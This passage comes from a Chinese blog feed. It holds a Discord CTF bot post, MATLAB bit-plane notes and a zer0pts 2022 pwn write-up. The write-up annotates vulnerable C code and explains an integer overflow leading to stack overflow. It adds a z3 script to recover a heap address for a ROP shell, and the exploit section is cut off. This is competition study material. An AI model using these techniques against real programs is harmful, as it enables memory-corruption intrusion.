@tasks.loop(<span class="params">seconds=<span class="number">60</span></span>)</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">first_blood</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">await</span> self.bot.wait_until_ready()</span><br><span class="line">        <span class="comment"># print(&quot;check1&quot;)</span></span><br><span class="line">        <span class="comment"># 这里的ID是读取json返回数据中比当前参数输入id更大的所有消息，以及notice。但是要确保收到一血消息，检查is_task字段即可。</span></span><br><span class="line">        <span class="built_in">print</span>(self.index)</span><br><span class="line">        guild = self.bot.get_guild(XCTF_GUILD)</span><br><span class="line">        <span class="comment"># 注意下面的evt要根据不同的比赛修改</span></span><br><span class="line">        res = requests.get(<span class="string">&#x27;https://adworld.xctf.org.cn/api/evts/notices&#x27;</span>, params=&#123;<span class="string">&#x27;evt&#x27;</span>: <span class="number">171</span>, <span class="string">&#x27;id&#x27;</span>: self.index&#125;, cookies=&#123;<span class="string">&#x27;session&#x27;</span>: <span class="string">&#x27;访问上述网页看到的session&#x27;</span>&#125;)</span><br><span class="line">        res.encoding = <span class="string">&#x27;Unicode&#x27;</span></span><br><span class="line">        result_text = res.text</span><br><span class="line">        <span class="comment"># 将text转换为json并分析</span></span><br><span class="line">        json_data = json.loads(result_text)</span><br><span class="line">        <span class="comment"># print(json_data)</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> json_data:</span><br><span class="line">            <span class="comment"># 这个json_data怎么选的下面会写</span></span><br><span class="line">            <span class="keyword">if</span> (item[<span class="string">&#x27;is_task&#x27;</span>] == <span class="number">1</span>):</span><br><span class="line">                <span class="comment"># name = &#x27;first-blood&#x27;</span></span><br><span class="line">                name = <span class="string">&#x27;main-chat&#x27;</span></span><br><span class="line">                <span class="keyword">if</span>(item[<span class="string">&#x27;id&#x27;</span>] &gt; self.index):</span><br><span class="line">                    self.index = item[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">                    <span class="comment"># name这里写要发送到的channel的名字。</span></span><br><span class="line">                <span class="keyword">await</span> utils.get(guild.text_channels,name=name).send(item[<span class="string">&#x27;notice&#x27;</span>])</span><br><span class="line">            <span class="comment"># else:</span></span><br><span class="line">            <span class="comment">#     name = &#x27;announcement&#x27;</span></span><br><span class="line">            <span class="comment">#     await utils.get(guild.text_channels,name=name).send(item[&#x27;notice&#x27;])</span></span><br><span class="line">            <span class="built_in">print</span>(item)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @commands.command()</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">stop</span>(<span class="params">self, ctx</span>):</span><br><span class="line">        <span class="keyword">if</span> ctx.channel.name == <span class="string">&#x27;main-chat&#x27;</span>: <span class="comment"># 能够控制bot的命令只有发在main-chat里面才反应</span></span><br><span class="line">            <span class="keyword">await</span> ctx.send(<span class="string">&#x27;Bye!&#x27;</span>)</span><br><span class="line">            <span class="keyword">await</span> bot.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bot.add_cog(MyCog(bot, <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;index: &#x27;</span>))))</span><br><span class="line"></span><br><span class="line">bot.run(TOKEN)</span><br></pre></td></tr></table></figure><ol><li>如何找到server guild可以参考下文。<br><a href="https://poshbot.readthedocs.io/en/latest/guides/backends/setup-discord-backend/#find-your-guild-id-server-id">https://poshbot.readthedocs.io/en/latest/guides/backends/setup-discord-backend/#find-your-guild-id-server-id</a></li></ol><p><img src="/2022/04/01/fb-bot-discord/image-20220401131038584.png" alt="image-20220401131038584"></p><ol start="2"><li>如何找到channel？连接的最后一个反斜杠后面的就是</li></ol><p><img src="/2022/04/01/fb-bot-discord/image-20220401221639322.png" alt="image-20220401221639322"></p><ol start="3"><li>为什么json这样写，可以打开一个上面代码第44行的网站看一眼就知道了。</li></ol><p><img src="/2022/04/01/fb-bot-discord/image-20220401221149760.png" alt="image-20220401221149760"></p><p>可以看到xctf发出的信息都是这种格式。注意is_task字段，这个区分了是announcement还是一血播报。我们只要根据这个，然后提取出notice就可以了。另外注意每次请求的URL里面的id是<strong>返回内容中最小的id</strong>。举个例子上面可以看到消息id最大是2271.那么如果请求id=2200就会显示2200到2271的所有消息。所以每一次请求完，要记录一下最新的ID，防止重复播报一血。这一点在代码56行体现。</p><ol start="4"><li>session怎么看?</li></ol><p>我安装了火狐插件<code>EditThisCookie</code>。可以直接在这里看到。</p><p><img src="/2022/04/01/fb-bot-discord/image-20220401221850416.png" alt="image-20220401221850416"></p><p>发个命令测试，都是没问题的</p><p><img src="/2022/04/01/fb-bot-discord/image-20220401221958874.png" alt="image-20220401221958874"></p><p>上述bot只是实现了最简单的一血播报。想不到还有什么好玩的命令了。</p>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fb-bot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matlab-1</title>
      <link href="/2022/03/31/matlab-1/"/>
      <url>/2022/03/31/matlab-1/</url>
      
        <content type="html"><![CDATA[<p>学校数字水印课笔记——matlab使用小记</p><span id="more"></span><h1 id="task1-清除最低RGB位"><a href="#task1-清除最低RGB位" class="headerlink" title="task1 清除最低RGB位"></a>task1 清除最低RGB位</h1><p>将图像的第0位位平面清零。</p><p>位平面就是把图像RGB表示下的每一个bit分层表示。</p><p><img src="/2022/03/31/matlab-1/image-20220331092824217.png" alt="image-20220331092824217"></p><p>完成task1代码。主要是用bitand来去除最后一个bit。注意这里输入结束之后好像没有自动弹窗?<strong>要放在脚本中运行才可以，如果是交互式可能一次只能弹出一个图像</strong></p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; data = imread(<span class="string">&#x27;e:\\lena.bmp&#x27;</span>);</span><br><span class="line">&gt;&gt; data1 = bitand(data,<span class="number">254</span>);</span><br><span class="line">&gt;&gt; subplot(<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>),imshow(data),title(<span class="string">&#x27;original&#x27;</span>);</span><br><span class="line">&gt;&gt; subplot(<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>),imshow(data1),title(<span class="string">&#x27;after&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="/2022/03/31/matlab-1/image-20220331094757382.png" alt="image-20220331094757382"></p><p>新建脚本的地方在这里。</p><p><img src="/2022/03/31/matlab-1/image-20220331095515663.png" alt="image-20220331095515663"></p><h1 id="task2-清除最高RGB位"><a href="#task2-清除最高RGB位" class="headerlink" title="task2 清除最高RGB位"></a>task2 清除最高RGB位</h1><p>和上面的代码类似，现在是处理最高位，将最高位清零。</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data = imread(<span class="string">&#x27;e:\\lena.bmp&#x27;</span>);</span><br><span class="line">data1 = bitand(data,<span class="number">127</span>);</span><br><span class="line">subplot(<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>),imshow(data),title(<span class="string">&#x27;original&#x27;</span>);</span><br><span class="line">subplot(<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>),imshow(data1),title(<span class="string">&#x27;after&#x27;</span>)</span><br></pre></td></tr></table></figure><p>可以看到差别很大</p><p><img src="/2022/03/31/matlab-1/image-20220331095540793.png" alt="image-20220331095540793"></p><h1 id="task3-处理每个图层生成灰度图像"><a href="#task3-处理每个图层生成灰度图像" class="headerlink" title="task3 处理每个图层生成灰度图像"></a>task3 处理每个图层生成灰度图像</h1><p>这里需要知道图层是怎么储存的。在matlab中，每读入一个图片，图片的bitmap都会以[R,G,B]的数组形式储存。因此我们需要把每一个像素点切片。代码如下。</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">data = imread(<span class="string">&#x27;e:\\lena.bmp&#x27;</span>);</span><br><span class="line">R = data(:,:,<span class="number">1</span>);</span><br><span class="line">G = data(:,:,<span class="number">2</span>);</span><br><span class="line">B = data(:,:,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">subplot(<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>),imshow(data),title(<span class="string">&#x27;full&#x27;</span>);</span><br><span class="line">subplot(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>),imshow(R),title(<span class="string">&#x27;R layer&#x27;</span>);</span><br><span class="line">subplot(<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>),imshow(G),title(<span class="string">&#x27;G layer&#x27;</span>);</span><br><span class="line">subplot(<span class="number">2</span>,<span class="number">2</span>,<span class="number">4</span>),imshow(B),title(<span class="string">&#x27;B layer&#x27;</span>);</span><br></pre></td></tr></table></figure><p>可以直接观察data和RGB三种数组的区别。可以看到matlab为了节省空间，并不是将每一个像素点用一个结构体(red,green,blue)表示，而是分开存放每一种像素。这种操作能够在我们提取出每种像素点时，大大节约空间。(不然会出现(0,0,255)这种情况，会浪费)</p><p><img src="/2022/03/31/matlab-1/image-20220331102104241.png" alt="image-20220331102104241"></p><p>以下是输出结果。</p><p><img src="/2022/03/31/matlab-1/image-20220331101522030.png" alt="image-20220331101522030"></p><blockquote><p>这里有一个疑问，为什么不是输出每种颜色的纯色图像，而是灰度图像呢?</p><p>个人觉得是因为储存方式改变了(没有*3的bitmap)，让matlab默认处理时当成了灰度图片输出。</p></blockquote><blockquote><p>同时注意，如果按照1中方法对图片末尾bit清零，<strong>实际上是对R,G,B三个数组的每一个的最后一位都清零</strong>。也就是方法一等价于我们提取出每一种RGB的图层，清除最低位之后再合并的结果。</p></blockquote><p><img src="/2022/03/31/matlab-1/image-20220331102808801.png" alt="image-20220331102808801"></p><p>直观上来理解，也是原始图像的三维数组每一个数组都经过了这种操作。</p><h1 id="合并图像各个图层"><a href="#合并图像各个图层" class="headerlink" title="合并图像各个图层"></a>合并图像各个图层</h1><p>下面做实验复现一下上面的想法。用两种方法处理各个图层，后者进行合并。然后用assert判断两者是相等的。</p><p><img src="/2022/03/31/matlab-1/image-20220331110046214.png" alt="image-20220331110046214"></p><p>代码如下</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">data = imread(<span class="string">&#x27;e:\\lena.bmp&#x27;</span>);</span><br><span class="line">data1 = bitand(data,<span class="number">254</span>);</span><br><span class="line">subplot(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>),imshow(data1),title(<span class="string">&#x27;直接处理&#x27;</span>)</span><br><span class="line">R = data(:,:,<span class="number">1</span>);</span><br><span class="line">G = data(:,:,<span class="number">2</span>);</span><br><span class="line">B = data(:,:,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">subplot(<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>),imshow(data),title(<span class="string">&#x27;原始图像&#x27;</span>);</span><br><span class="line">R=bitand(R,<span class="number">254</span>);</span><br><span class="line">G=bitand(G,<span class="number">254</span>);</span><br><span class="line">B=bitand(B,<span class="number">254</span>);</span><br><span class="line">data2(:,:,<span class="number">1</span>) = R;</span><br><span class="line">data2(:,:,<span class="number">2</span>) = G;</span><br><span class="line">data2(:,:,<span class="number">3</span>) = B;</span><br><span class="line">subplot(<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>),imshow(data2),title(<span class="string">&#x27;三个维度合并图像&#x27;</span>);</span><br><span class="line">assert(<span class="built_in">isequal</span>(data2,data1));</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> water_print </category>
          
      </categories>
      
      
        <tags>
            
            <tag> matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zer0pts2022_accountant</title>
      <link href="/2022/03/29/zer0pts2022-accountant/"/>
      <url>/2022/03/29/zer0pts2022-accountant/</url>
      
        <content type="html"><![CDATA[<p>好久没发博客了，一方面因为复现虎符实在是自闭了，一个周末怎么看都没看懂那道vdq和gogogo，另一方面做的buu题目也不是很有价值。这里记录一下复现的2022zer0ctf的accountant。感觉这里的题目还是对我这种菜鸡比较友好的。</p><span id="more"></span><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><p>代码主要实现了一个首先读取用户输入的商品个数，其次逐个读取用户的price和quality输入，加到对应的商品属性上面，在用户输入完成之后，将两者乘起来输出。并且根据用户输入的是否修改相应属性。主要结构体item为。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 8 byte</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">int32_t</span> price;</span><br><span class="line">  <span class="type">int32_t</span> quantity;</span><br><span class="line">&#125; Item;</span><br></pre></td></tr></table></figure><p>在修改数据和输入数据时，对于下标都有严格的限制。下标溢出基本无法做到。</p><h2 id="全部代码"><a href="#全部代码" class="headerlink" title="全部代码"></a>全部代码</h2><p>带有了自己的一点注释。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Credit to Apple Inc.</span></span><br><span class="line"><span class="comment">// https://opensource.apple.com/source/cvs/cvs-44/cvs/lib/allocsa.h.auto.html</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> safe_alloca(N) ((N) &lt; 4032 ? alloca (N) : NULL)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">int32_t</span> price;</span><br><span class="line">  <span class="type">int32_t</span> quantity;</span><br><span class="line">&#125; Item;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">get_value</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *msg)</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, msg);</span><br><span class="line">  <span class="keyword">if</span> (read(<span class="number">0</span>, buf, <span class="number">31</span>) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I/O Error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> strtol(buf, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">input_data</span><span class="params">(Item *items, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Item %d:\n&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">  items[i].price = get_value(<span class="string">&quot;  Price: $&quot;</span>);</span><br><span class="line">  items[i].quantity = get_value(<span class="string">&quot;  Quantity: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">input_all_data</span><span class="params">(Item *items, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    input_data(items, i);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int64_t</span> <span class="title function_">calc_total</span><span class="params">(Item *items, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">  <span class="type">int64_t</span> total = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> i = n - <span class="number">1</span>;  <span class="comment">// 如果传入n是0，得到-1，但是不能读libc</span></span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    total += items[i].price * items[i].quantity;  <span class="comment">// if n=0 is input, then i =-1, we can get some info</span></span><br><span class="line">  &#125; <span class="keyword">while</span>(i-- &gt; <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">180</span>);</span><br><span class="line"></span><br><span class="line">  Item *items;</span><br><span class="line">  <span class="type">int</span> use_malloc = <span class="number">0</span>;</span><br><span class="line">  <span class="type">ssize_t</span> n = get_value(<span class="string">&quot;Number of items: &quot;</span>); <span class="comment">// 这里可以写一个比较大的数字，0x2000000000000000，因为n是long类型的</span></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid value&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((items = safe_alloca(n * <span class="keyword">sizeof</span>(Item))) == <span class="literal">NULL</span>) &#123; <span class="comment">// 直接在栈上分配空间,可以溢出</span></span><br><span class="line">    use_malloc = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((items = <span class="built_in">calloc</span>(n, <span class="keyword">sizeof</span>(Item))) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Memory Error\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  input_all_data(items, n); <span class="comment">// 但是这里对n又强制转换为int</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Total: $%ld\n&quot;</span>, calc_total(items, n)); <span class="comment">// 这里似乎是唯一能泄露的地方，必须泄露至少code_base来返回，最好泄露Libc</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (get_value(<span class="string">&quot;Would you like to fix data? [1=Yes] &quot;</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="type">off_t</span> i = get_value(<span class="string">&quot;Index to modify (-1 to quit): &quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= n)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        input_data(items, i); <span class="comment">// 这里可以越界写(真是太难发现了)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Total: $%ld\n&quot;</span>, calc_total(items, n));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Have a nice day at work!&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (use_malloc)</span><br><span class="line">    <span class="built_in">free</span>(items);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>zer0pts好的一个地方就是所有pwn都给了源码。这就是实力啊，给了源码你也做不出才是难。</p><p>首先去题目里面给的<a href="*https://opensource.apple.com/source/cvs/cvs-44/cvs/lib/allocsa.h.auto.html*">链接</a>看看本题中使用到的safe_alloc是什么意思。发现是一种在栈上分配alloc出来的内存而不是在堆上的方式。唯一一个使用到的地方如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> safe_alloca(N) ((N) &lt; 4032 ? alloca (N) : NULL)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((items = safe_alloca(n * <span class="keyword">sizeof</span>(Item))) == <span class="literal">NULL</span>) &#123; <span class="comment">// 直接在栈上分配空间</span></span><br><span class="line">    use_malloc = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((items = <span class="built_in">calloc</span>(n, <span class="keyword">sizeof</span>(Item))) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Memory Error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的<code>sizeof(item)</code>是8。可以看到抽象而言，我们能够分配栈上任意长度的数据，后续还可以写。有想到一种方法就是分配的比较小，但是能写的比较多，也就造成了常见的栈溢出。但是一开始看了半天，也没觉得这里能溢出。因为一旦n比较大，就变成堆上分配了。</p><h2 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h2><p>看了队里大佬的wp，才发现这里存在一个整数溢出，可以导致栈分配空间变小。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Item *items;</span><br><span class="line"><span class="type">int</span> use_malloc = <span class="number">0</span>;</span><br><span class="line"><span class="type">ssize_t</span> n = get_value(<span class="string">&quot;Number of items: &quot;</span>); <span class="comment">// 这里可以写一个比较大的数字，0x2000000000000000，因为n是long类型的</span></span><br><span class="line"><span class="keyword">if</span> (n &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Invalid value&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这里n如果写的比较大，例如0x2000000000000000，结合sizeof(item)是8，在safe_alloca中乘起来的结果将会是0！但是由于ssize_t是long类型的，因此n依然会被保留。通过这个我们能够任意栈溢出。可以考虑直接ROP。</p><p>但是如何泄露地址?我们只有一次输出机会。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">input_all_data(items, n); <span class="comment">// 但是这里对n又强制转换为int</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Total: $%ld\n&quot;</span>, calc_total(items, n)); <span class="comment">// 这里似乎是唯一能泄露的地方，必须泄露至少code_base来返回，最好泄露Libc</span></span><br></pre></td></tr></table></figure><p>如果直接写0x200000000000000，通过调试，可以看到下面的结果。</p><p><img src="/2022/03/29/zer0pts2022-accountant/image-20220330084848016.png" alt="image-20220330084848016"></p><p>是0x486006bc*0x000055e3。也就是一个堆地址。但是输出是这两个的乘积(calc_total)。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int64_t</span> <span class="title function_">calc_total</span><span class="params">(Item *items, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">  <span class="type">int64_t</span> total = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> i = n - <span class="number">1</span>;  <span class="comment">// 如果传入n是0，得到-1，但是不能读libc</span></span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    total += items[i].price * items[i].quantity;  <span class="comment">// if n=0 is input, then i =-1, we can get some info</span></span><br><span class="line">  &#125; <span class="keyword">while</span>(i-- &gt; <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="约束求解"><a href="#约束求解" class="headerlink" title="约束求解"></a>约束求解</h2><p>这里也是通过这道题重新学习了一下z3的使用，可以用约束求解的方式解决此问题。加上限制堆地址0x5500到0x56ff，并且末三位已知，并且乘积已知，可以很容易通过z3求解堆地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">total</span>):</span><br><span class="line">    high = BitVec(<span class="string">&quot;high&quot;</span>,<span class="number">16</span>)</span><br><span class="line">    mid = BitVec(<span class="string">&quot;mid&quot;</span>,<span class="number">20</span>)</span><br><span class="line">    low = BitVecVal(<span class="number">0xb6c</span>,<span class="number">32</span>)</span><br><span class="line">    solver = Solver()</span><br><span class="line">    solver.add(high&gt;=<span class="number">0x5500</span>)</span><br><span class="line">    solver.add(high&lt;=<span class="number">0x56ff</span>)</span><br><span class="line">    mid_low = (ZeroExt(<span class="number">12</span>,mid)&lt;&lt;<span class="number">12</span>)+low</span><br><span class="line">    solver.add((mid_low*ZeroExt(<span class="number">16</span>,high)) == total)</span><br><span class="line">    solver.check()</span><br><span class="line">    m = solver.model()</span><br><span class="line">    mid_ans = <span class="built_in">int</span>(<span class="built_in">str</span>(m.evaluate(mid)))</span><br><span class="line">    high_ans = <span class="built_in">int</span>(<span class="built_in">str</span>(m.evaluate(high)))</span><br><span class="line">    <span class="comment"># print(&quot;mid: %x&quot; % mid_ans)</span></span><br><span class="line">    <span class="comment"># print(&quot;high: %x&quot; % high_ans)</span></span><br><span class="line">    ans = <span class="number">0</span></span><br><span class="line">    ans  = ans + (high_ans &lt;&lt; <span class="number">32</span>)</span><br><span class="line">    ans  = ans + (mid_ans &lt;&lt; <span class="number">12</span>)</span><br><span class="line">    ans  = ans +<span class="number">0xb6c</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ans: %x&quot;</span> % ans)</span><br><span class="line">    <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><p>有了堆地址，直接ROP就能getshell了。后面十分简单。</p><h1 id="exp"><a href="#exp" class="headerlink" 